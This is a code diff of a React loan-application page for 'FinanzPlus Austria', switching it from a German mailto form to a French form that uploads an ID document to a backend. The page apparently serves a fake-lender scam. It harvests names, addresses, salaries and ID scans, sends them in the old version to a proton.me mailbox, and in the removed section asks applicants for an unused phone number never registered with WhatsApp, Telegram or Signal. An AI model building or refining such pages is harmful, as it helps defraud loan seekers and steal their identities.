@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import './App.css';
 
 function App() {
@@ -6,146 +6,141 @@ function App() {
     nom: '',
     prenom: '',
     age: '',
+    sexe: '',
     adresse: '',
     telephone: '',
     travail: '',
-    revenuMensuel: '',
-    montantPret: '',
-    dureeRemboursement: '',
-    accepteConditions: false
+    salaireMensuel: '',
+    accepteConfidentialite: false
   });
 
+  const [identityFile, setIdentityFile] = useState(null);
+  const [identityPreview, setIdentityPreview] = useState(null);
   const [errors, setErrors] = useState({});
   const [submitStatus, setSubmitStatus] = useState(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const fileInputRef = useRef(null);
 
-  // Gestion des changements de champs texte
   const handleInputChange = (e) => {
     const { name, value, type, checked } = e.target;
     setFormData(prev => ({
       ...prev,
       [name]: type === 'checkbox' ? checked : value
     }));
-    
-    // Effacer l'erreur du champ modifié
     if (errors[name]) {
       setErrors(prev => ({ ...prev, [name]: '' }));
     }
   };
 
-  // Validation du formulaire
+  const handleFileChange = (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    const allowed = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
+    if (!allowed.includes(file.type)) {
+      setErrors(prev => ({ ...prev, identityFile: 'Format non autorisé. Utilisez JPG, PNG ou PDF.' }));
+      return;
+    }
+    if (file.size > 10 * 1024 * 1024) {
+      setErrors(prev => ({ ...prev, identityFile: 'Fichier trop volumineux (max 10 Mo).' }));
+      return;
+    }
+
+    setIdentityFile(file);
+    setErrors(prev => ({ ...prev, identityFile: '' }));
+
+    if (file.type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onloadend = () => setIdentityPreview(reader.result);
+      reader.readAsDataURL(file);
+    } else {
+      setIdentityPreview('pdf');
+    }
+  };
+
   const validateForm = () => {
     const newErrors = {};
 
-    if (!formData.nom.trim()) newErrors.nom = 'Nachname ist erforderlich';
-    if (!formData.prenom.trim()) newErrors.prenom = 'Vorname ist erforderlich';
+    if (!formData.nom.trim()) newErrors.nom = 'Le nom de famille est requis.';
+    if (!formData.prenom.trim()) newErrors.prenom = 'Le prénom est requis.';
     if (!formData.age || formData.age < 18 || formData.age > 100) {
-      newErrors.age = 'Das Alter muss zwischen 18 und 100 Jahren liegen';
+      newErrors.age = "L'âge doit être compris entre 18 et 100 ans.";
     }
-    if (!formData.adresse.trim()) newErrors.adresse = 'Adresse ist erforderlich';
+    if (!formData.sexe) newErrors.sexe = 'Veuillez sélectionner votre sexe.';
+    if (!formData.adresse.trim()) newErrors.adresse = "L'adresse est requise.";
     if (!formData.telephone.trim()) {
-      newErrors.telephone = 'Telefonnummer ist erforderlich';
-    } else if (!/^\+?[\d\s\-()]+$/.test(formData.telephone)) {
-      newErrors.telephone = 'Ungültiges Telefonformat';
+      newErrors.telephone = 'Le numéro de téléphone est requis.';
+    } else if (!/^\+?[\d\s\-()]{6,20}$/.test(formData.telephone)) {
+      newErrors.telephone = 'Format de numéro invalide.';
     }
-    if (!formData.travail.trim()) newErrors.travail = 'Beruf ist erforderlich';
-    if (!formData.revenuMensuel || formData.revenuMensuel <= 0) {
-      newErrors.revenuMensuel = 'Das monatliche Einkommen muss größer als 0 sein';
+    if (!formData.travail.trim()) newErrors.travail = 'Le travail est requis.';
+    if (!formData.salaireMensuel || Number(formData.salaireMensuel) <= 0) {
+      newErrors.salaireMensuel = 'Le salaire mensuel doit être supérieur à 0.';
     }
-    if (!formData.montantPret || formData.montantPret <= 0) {
-      newErrors.montantPret = 'Der Kreditbetrag muss größer als 0 sein';
-    }
-    if (!formData.dureeRemboursement || formData.dureeRemboursement < 1 || formData.dureeRemboursement > 360) {
-      newErrors.dureeRemboursement = 'Die Rückzahlungsdauer muss zwischen 1 und 360 Monaten liegen';
-    }
-    if (!formData.accepteConditions) {
-      newErrors.accepteConditions = 'Sie müssen die Teilnahmebedingungen akzeptieren';
+    if (!identityFile) newErrors.identityFile = 'Veuillez importer votre pièce d\'identité.';
+    if (!formData.accepteConfidentialite) {
+      newErrors.accepteConfidentialite = 'Vous devez accepter la clause de confidentialité.';
     }
 
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
 
-  // Soumission du formulaire
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
     if (!validateForm()) {
-      setSubmitStatus({
-        type: 'error',
-        message: 'Bitte korrigieren Sie die Fehler im Formular'
-      });
+      setSubmitStatus({ type: 'error', message: 'Veuillez corriger les erreurs dans le formulaire.' });
       return;
     }
 
-    // Créer le corps de l'email avec toutes les informations EN ALLEMAND
-    const emailBody = `
-KREDITANTRAG FINANZPLUS AUSTRIA
-=====================================
+    setIsSubmitting(true);
+    setSubmitStatus(null);
 
-PERSÖNLICHE INFORMATIONEN
--------------------------
-Name: ${formData.nom}
-Vorname: ${formData.prenom}
-Alter: ${formData.age} Jahre
-Adresse: ${formData.adresse}
+    try {
+      const data = new FormData();
+      data.append('nom', formData.nom);
+      data.append('prenom', formData.prenom);
+      data.append('age', formData.age);
+      data.append('sexe', formData.sexe);
+      data.append('adresse', formData.adresse);
+      data.append('telephone', formData.telephone);
+      data.append('travail', formData.travail);
+      data.append('salaireMensuel', formData.salaireMensuel);
+      data.append('accepteConfidentialite', formData.accepteConfidentialite);
+      data.append('identityDocument', identityFile);
 
-KONTAKTDATEN
-------------
-Telefonnummer: ${formData.telephone}
-
-BERUFLICHE UND FINANZIELLE INFORMATIONEN
------------------------------------------
-Beruf: ${formData.travail}
-Monatliches Einkommen: ${formData.revenuMensuel} €
-
-KREDITDETAILS
--------------
-Gewünschter Kreditbetrag: ${formData.montantPret} €
-Rückzahlungsdauer: ${formData.dureeRemboursement} Monate
-
-DOKUMENTE
----------
-⚠️ WICHTIG: Bitte fügen Sie die folgenden Dokumente als Anhang zu dieser E-Mail hinzu:
-- Personalausweis/Reisepass (PDF, JPG oder PNG)
-- Lichtbild (JPG oder PNG)
-
-ZUSTIMMUNG
-----------
-✓ Ich akzeptiere die Teilnahmebedingungen
-
-=====================================
-Einreichungsdatum: ${new Date().toLocaleString('de-DE')}
-    `.trim();
-
-    // Créer le lien mailto avec le sujet et le corps
-    const subject = encodeURIComponent('Kreditantrag FinanzPlus Austria');
-    const body = encodeURIComponent(emailBody);
-    const mailtoLink = `mailto:kontakt_finanzplusaustria@proton.me?subject=${subject}&body=${body}`;
-
-    // Ouvrir le client email
-    window.location.href = mailtoLink;
-
-    // Afficher un message de succès EN ALLEMAND
-    setSubmitStatus({
-      type: 'success',
-      message: 'Ihr E-Mail-Client wird geöffnet. Vergessen Sie nicht, die Dokumente (Personalausweis und Foto) anzuhängen, bevor Sie senden!'
-    });
-
-    // Réinitialiser le formulaire après 3 secondes
-    setTimeout(() => {
-      setFormData({
-        nom: '',
-        prenom: '',
-        age: '',
-        adresse: '',
-        telephone: '',
-        travail: '',
-        revenuMensuel: '',
-        montantPret: '',
-        dureeRemboursement: '',
-        accepteConditions: false
+      const response = await fetch('http://localhost:5000/api/submit-application', {
+        method: 'POST',
+        body: data
       });
-    }, 3000);
+
+      const result = await response.json();
+
+      if (result.success) {
+        setSubmitStatus({
+          type: 'success',
+          message: 'Votre demande a été envoyée avec succès ! Nous vous contacterons très prochainement.'
+        });
+        // Réinitialiser le formulaire
+        setFormData({
+          nom: '', prenom: '', age: '', sexe: '', adresse: '',
+          telephone: '', travail: '', salaireMensuel: '', accepteConfidentialite: false
+        });
+        setIdentityFile(null);
+        setIdentityPreview(null);
+        if (fileInputRef.current) fileInputRef.current.value = '';
+      } else {
+        setSubmitStatus({ type: 'error', message: result.message || 'Une erreur est survenue.' });
+      }
+    } catch (err) {
+      setSubmitStatus({
+        type: 'error',
+        message: 'Impossible de contacter le serveur. Vérifiez que le backend est démarré.'
+      });
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -153,231 +148,171 @@ Einreichungsdatum: ${new Date().toLocaleString('de-DE')}
       <div className="container">
         <header className="header">
           <h1>FinanzPlus Austria</h1>
-          <p className="subtitle">Kreditwürdigkeitsformular</p>
+          <p className="subtitle">Formulaire de demande — Kreditwürdigkeitsformular</p>
         </header>
 
         <form onSubmit={handleSubmit} className="form">
-          {/* SECTION 1: INFORMATIONS PERSONNELLES */}
+
+          {/* SECTION 1 : INFORMATIONS PERSONNELLES */}
           <section className="form-section">
-            <h2 className="section-title">📋 Persönliche Informationen</h2>
-            
-            <div className="form-group">
-              <label htmlFor="nom">Nachname *</label>
-              <input
-                type="text"
-                id="nom"
-                name="nom"
-                value={formData.nom}
-                onChange={handleInputChange}
-                className={errors.nom ? 'error' : ''}
-                placeholder="Ihr Nachname"
-              />
-              {errors.nom && <span className="error-message">{errors.nom}</span>}
+            <h2 className="section-title">📋 Informations personnelles</h2>
+
+            <div className="form-row">
+              <div className="form-group">
+                <label htmlFor="nom">Nom de famille *</label>
+                <input type="text" id="nom" name="nom" value={formData.nom}
+                  onChange={handleInputChange} className={errors.nom ? 'error' : ''}
+                  placeholder="Votre nom de famille" />
+                {errors.nom && <span className="error-message">{errors.nom}</span>}
+              </div>
+
+              <div className="form-group">
+                <label htmlFor="prenom">Prénom *</label>
+                <input type="text" id="prenom" name="prenom" value={formData.prenom}
+                  onChange={handleInputChange} className={errors.prenom ? 'error' : ''}
+                  placeholder="Votre prénom" />
+                {errors.prenom && <span className="error-message">{errors.prenom}</span>}
+              </div>
+            </div>
+
+            <div className="form-row">
+              <div className="form-group">
+                <label htmlFor="age">Âge *</label>
+                <input type="number" id="age" name="age" value={formData.age}
+                  onChange={handleInputChange} className={errors.age ? 'error' : ''}
+                  placeholder="Votre âge" min="18" max="100" />
+                {errors.age && <span className="error-message">{errors.age}</span>}
+              </div>
+
+              <div className="form-group">
+                <label htmlFor="sexe">Sexe *</label>
+                <select id="sexe" name="sexe" value={formData.sexe}
+                  onChange={handleInputChange} className={`select-input${errors.sexe ? ' error' : ''}`}>
+                  <option value="">-- Sélectionnez --</option>
+                  <option value="Homme">Homme</option>
+                  <option value="Femme">Femme</option>
+                  <option value="Autre">Autre</option>
+                </select>
+                {errors.sexe && <span className="error-message">{errors.sexe}</span>}
+              </div>
             </div>
 
             <div className="form-group">
-              <label htmlFor="prenom">Vorname *</label>
-              <input
-                type="text"
-                id="prenom"
-                name="prenom"
-                value={formData.prenom}
-                onChange={handleInputChange}
-                className={errors.prenom ? 'error' : ''}
-                placeholder="Ihr Vorname"
-              />
-              {errors.prenom && <span className="error-message">{errors.prenom}</span>}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="age">Alter *</label>
-              <input
-                type="number"
-                id="age"
-                name="age"
-                value={formData.age}
-                onChange={handleInputChange}
-                className={errors.age ? 'error' : ''}
-                placeholder="Ihr Alter"
-                min="18"
-                max="100"
-              />
-              {errors.age && <span className="error-message">{errors.age}</span>}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="adresse">Adresse *</label>
-              <textarea
-                id="adresse"
-                name="adresse"
-                value={formData.adresse}
-                onChange={handleInputChange}
-                className={errors.adresse ? 'error' : ''}
-                placeholder="Ihre vollständige Adresse"
-                rows="3"
-              />
+              <label htmlFor="adresse">Adresse complète *</label>
+              <textarea id="adresse" name="adresse" value={formData.adresse}
+                onChange={handleInputChange} className={errors.adresse ? 'error' : ''}
+                placeholder="Rue, numéro, code postal, ville, pays" rows="3" />
               {errors.adresse && <span className="error-message">{errors.adresse}</span>}
             </div>
           </section>
 
-          {/* SECTION 2: COORDONNÉES */}
+          {/* SECTION 2 : CONTACT */}
           <section className="form-section">
-            <h2 className="section-title">📞 Kontaktdaten</h2>
-            
+            <h2 className="section-title">📞 Coordonnées</h2>
             <div className="form-group">
-              <label htmlFor="telephone">Telefonnummer *</label>
-              <input
-                type="tel"
-                id="telephone"
-                name="telephone"
-                value={formData.telephone}
-                onChange={handleInputChange}
-                className={errors.telephone ? 'error' : ''}
-                placeholder="+43 XXX XXX XXXX"
-              />
+              <label htmlFor="telephone">Numéro de téléphone *</label>
+              <input type="tel" id="telephone" name="telephone" value={formData.telephone}
+                onChange={handleInputChange} className={errors.telephone ? 'error' : ''}
+                placeholder="+43 XXX XXX XXXX" />
               {errors.telephone && <span className="error-message">{errors.telephone}</span>}
             </div>
           </section>
 
-          {/* SECTION 3: INFORMATIONS PROFESSIONNELLES */}
+          {/* SECTION 3 : INFORMATIONS PROFESSIONNELLES */}
           <section className="form-section">
-            <h2 className="section-title">💼 Berufliche und Finanzielle Informationen</h2>
-            
+            <h2 className="section-title">💼 Informations professionnelles</h2>
+
             <div className="form-group">
-              <label htmlFor="travail">Beruf *</label>
-              <input
-                type="text"
-                id="travail"
-                name="travail"
-                value={formData.travail}
-                onChange={handleInputChange}
-                className={errors.travail ? 'error' : ''}
-                placeholder="Ihr Beruf"
-              />
+              <label htmlFor="travail">Profession / Travail *</label>
+              <input type="text" id="travail" name="travail" value={formData.travail}
+                onChange={handleInputChange} className={errors.travail ? 'error' : ''}
+                placeholder="Votre profession" />
               {errors.travail && <span className="error-message">{errors.travail}</span>}
             </div>
 
             <div className="form-group">
-              <label htmlFor="revenuMensuel">Monatliches Einkommen (€) *</label>
-              <input
-                type="number"
-                id="revenuMensuel"
-                name="revenuMensuel"
-                value={formData.revenuMensuel}
-                onChange={handleInputChange}
-                className={errors.revenuMensuel ? 'error' : ''}
-                placeholder="Ihr monatliches Einkommen in Euro"
-                min="0"
-                step="0.01"
-              />
-              {errors.revenuMensuel && <span className="error-message">{errors.revenuMensuel}</span>}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="montantPret">Gewünschter Kreditbetrag (€) *</label>
-              <input
-                type="number"
-                id="montantPret"
-                name="montantPret"
-                value={formData.montantPret}
-                onChange={handleInputChange}
-                className={errors.montantPret ? 'error' : ''}
-                placeholder="Wie viel möchten Sie leihen?"
-                min="0"
-                step="0.01"
-              />
-              {errors.montantPret && <span className="error-message">{errors.montantPret}</span>}
-            </div>
-
-            <div className="form-group">
-              <label htmlFor="dureeRemboursement">Rückzahlungsdauer (Monate) *</label>
-              <input
-                type="number"
-                id="dureeRemboursement"
-                name="dureeRemboursement"
-                value={formData.dureeRemboursement}
-                onChange={handleInputChange}
-                className={errors.dureeRemboursement ? 'error' : ''}
-                placeholder="Anzahl der Monate"
-                min="1"
-                max="360"
-              />
-              {errors.dureeRemboursement && <span className="error-message">{errors.dureeRemboursement}</span>}
+              <label htmlFor="salaireMensuel">Salaire mensuel (€) *</label>
+              <input type="number" id="salaireMensuel" name="salaireMensuel"
+                value={formData.salaireMensuel} onChange={handleInputChange}
+                className={errors.salaireMensuel ? 'error' : ''}
+                placeholder="Votre salaire mensuel en euros" min="0" step="0.01" />
+              {errors.salaireMensuel && <span className="error-message">{errors.salaireMensuel}</span>}
             </div>
           </section>
 
-          {/* SECTION 4: DOCUMENTS */}
+          {/* SECTION 4 : PIÈCE D'IDENTITÉ */}
           <section className="form-section">
-            <h2 className="section-title">📎 Dokumente und Nachweise</h2>
-            
-            <div className="info-box" style={{
-              backgroundColor: '#fff3cd',
-              border: '1px solid #ffc107',
-              borderRadius: '8px',
-              padding: '20px',
-              marginBottom: '20px'
-            }}>
-              <h3 style={{ color: '#856404', marginTop: 0 }}>📧 Wichtige Information zu Dokumenten</h3>
-              <p style={{ color: '#856404', marginBottom: '10px' }}>
-                Nach dem Absenden dieses Formulars öffnet sich Ihr E-Mail-Client automatisch mit einer vorausgefüllten Nachricht.
+            <h2 className="section-title">🪪 Pièce d'identité</h2>
+            <p className="section-desc">
+              Importez votre carte d'identité, passeport ou tout document officiel prouvant votre identité.
+            </p>
+
+            <div className="form-group">
+              <label htmlFor="identityDocument">Document d'identité * <span className="file-hint">(JPG, PNG ou PDF — max 10 Mo)</span></label>
+              <div className={`file-drop-zone${identityFile ? ' has-file' : ''}${errors.identityFile ? ' error-border' : ''}`}
+                onClick={() => fileInputRef.current && fileInputRef.current.click()}>
+                {!identityFile ? (
+                  <>
+                    <div className="file-drop-icon">📎</div>
+                    <p className="file-drop-text">Cliquez pour sélectionner votre fichier</p>
+                    <p className="file-drop-sub">JPG · PNG · PDF</p>
+                  </>
+                ) : (
+                  <div className="file-selected">
+                    {identityPreview && identityPreview !== 'pdf' ? (
+                      <img src={identityPreview} alt="Aperçu pièce d'identité" className="id-preview-img" />
+                    ) : (
+                      <div className="pdf-preview">📄 {identityFile.name}</div>
+                    )}
+                    <p className="file-name-label">{identityFile.name}</p>
+                    <button type="button" className="remove-file-btn"
+                      onClick={(e) => { e.stopPropagation(); setIdentityFile(null); setIdentityPreview(null); if (fileInputRef.current) fileInputRef.current.value = ''; }}>
+                      ✕ Supprimer
+                    </button>
+                  </div>
+                )}
+              </div>
+              <input ref={fileInputRef} type="file" id="identityDocument" name="identityDocument"
+                accept=".jpg,.jpeg,.png,.pdf" onChange={handleFileChange} style={{ display: 'none' }} />
+              {errors.identityFile && <span className="error-message">{errors.identityFile}</span>}
+            </div>
+          </section>
+
+          {/* SECTION 5 : CLAUSE DE CONFIDENTIALITÉ */}
+          <section className="form-section confidentiality-section">
+            <h2 className="section-title">🔒 Clause de confidentialité</h2>
+            <div className="confidentiality-box">
+              <h3>Accord de confidentialité — FinanzPlus Austria &amp; le Demandeur</h3>
+              <p>
+                Les informations personnelles collectées dans ce formulaire (nom, prénom, âge, sexe, adresse,
+                numéro de téléphone, profession, salaire mensuel et pièce d'identité) sont destinées
+                <strong> exclusivement à FinanzPlus Austria</strong> dans le cadre de l'évaluation de votre
+                demande de crédit.
               </p>
-              <p style={{ color: '#856404', marginBottom: '10px' }}>
-                <strong>Bitte fügen Sie die folgenden Dokumente als Anhänge zu dieser E-Mail hinzu:</strong>
+              <p>
+                FinanzPlus Austria s'engage à :
               </p>
-              <ul style={{ color: '#856404', marginLeft: '20px' }}>
-                <li><strong>Personalausweis oder Reisepass</strong> (PDF, JPG oder PNG)</li>
-                <li><strong>Lichtbild</strong> (JPG oder PNG)</li>
+              <ul>
+                <li>Ne jamais divulguer vos données personnelles à des tiers non autorisés.</li>
+                <li>Utiliser vos informations uniquement dans le cadre de votre dossier de crédit.</li>
+                <li>Protéger et sécuriser l'ensemble de vos documents transmis.</li>
+                <li>Respecter les lois en vigueur sur la protection des données personnelles (RGPD).</li>
+                <li>Détruire vos données sur simple demande de votre part, dès que le dossier est clôturé.</li>
               </ul>
-              <p style={{ color: '#856404', marginBottom: 0 }}>
-                ⚠️ <em>Ohne diese Dokumente kann Ihr Antrag nicht bearbeitet werden.</em>
+              <p>
+                En cochant la case ci-dessous, vous confirmez avoir lu, compris et accepté l'intégralité de
+                cet accord de confidentialité entre vous et FinanzPlus Austria.
               </p>
             </div>
-          </section>
 
-          {/* SECTION 5: CONDITIONS D'ÉLIGIBILITÉ */}
-          <section className="form-section eligibility-section">
-            <h2 className="section-title">✓ Teilnahmebedingungen</h2>
-            
-            <div className="eligibility-content">
-              <p className="eligibility-intro">
-                Um von unserem Kreditangebot von FinanzPlus Austria zu profitieren, müssen Sie die folgenden Kriterien erfüllen:
-              </p>
-              
-              <h3>Dedizierte Telefonnummer</h3>
-              <p>
-                Sie müssen über eine <strong>unbenutzte Telefonnummer</strong> verfügen, die noch nie bei einem
-                Kommunikationsdienst (WhatsApp, Telegram, Signal usw.) registriert wurde. Diese Nummer wird
-                ausschließlich als sichere Bankkontoidentifikation verwendet und erleichtert so Transaktionen
-                und Rückzahlungen Ihres Kredits ohne Interferenz mit anderen Drittanbieterdiensten.
-              </p>
-              <p>
-                Diese Maßnahme garantiert eine <strong>optimale Rückverfolgbarkeit</strong> Ihrer Zahlungen und
-                eine sichere Verwaltung Ihres Rückzahlungskontos.
-              </p>
-              <p className="eligibility-note">
-                Wenn Sie derzeit keine Telefonnummer haben, die diese Kriterien erfüllt, oder wenn Sie in der
-                Lage sind, eine für berufliche Zwecke zu beschaffen, aktivieren Sie bitte das Kontrollkästchen
-                unten, um Ihre Zustimmung zu diesen Teilnahmebedingungen zu bestätigen.
-              </p>
-            </div>
-          </section>
-
-          {/* SECTION 6: CONSENTEMENT */}
-          <section className="form-section">
-            <h2 className="section-title">✍️ Zustimmung</h2>
-            
             <div className="form-group checkbox-group">
               <label className="checkbox-label">
-                <input
-                  type="checkbox"
-                  name="accepteConditions"
-                  checked={formData.accepteConditions}
-                  onChange={handleInputChange}
-                  className={errors.accepteConditions ? 'error' : ''}
-                />
-                <span>Ich akzeptiere die Teilnahmebedingungen *</span>
+                <input type="checkbox" name="accepteConfidentialite"
+                  checked={formData.accepteConfidentialite} onChange={handleInputChange}
+                  className={errors.accepteConfidentialite ? 'error' : ''} />
+                <span>J'ai lu et j'accepte la clause de confidentialité entre moi et FinanzPlus Austria. *</span>
               </label>
-              {errors.accepteConditions && <span className="error-message">{errors.accepteConditions}</span>}
+              {errors.accepteConfidentialite && <span className="error-message">{errors.accepteConfidentialite}</span>}
             </div>
           </section>
 
@@ -388,23 +323,19 @@ Einreichungsdatum: ${new Date().toLocaleString('de-DE')}
             </div>
           )}
 
-          {/* SECTION 7: SOUMISSION */}
+          {/* SECTION 6 : ENVOI */}
           <section className="form-section submit-section">
-            <button
-              type="submit"
-              className="submit-button"
-              disabled={!formData.accepteConditions}
-            >
-              Antrag einreichen
+            <button type="submit" className="submit-button"
+              disabled={!formData.accepteConfidentialite || isSubmitting}>
+              {isSubmitting ? 'Envoi en cours...' : 'Envoyer ma demande'}
             </button>
-            <p className="submit-note">
-              * Pflichtfelder
-            </p>
+            <p className="submit-note">* Champs obligatoires</p>
           </section>
+
         </form>
 
         <footer className="footer">
-          <p>© 2026 FinanzPlus Austria - Alle Rechte vorbehalten</p>
+          <p>© 2026 FinanzPlus Austria — Tous droits réservés</p>
         </footer>
       </div>
     </div>
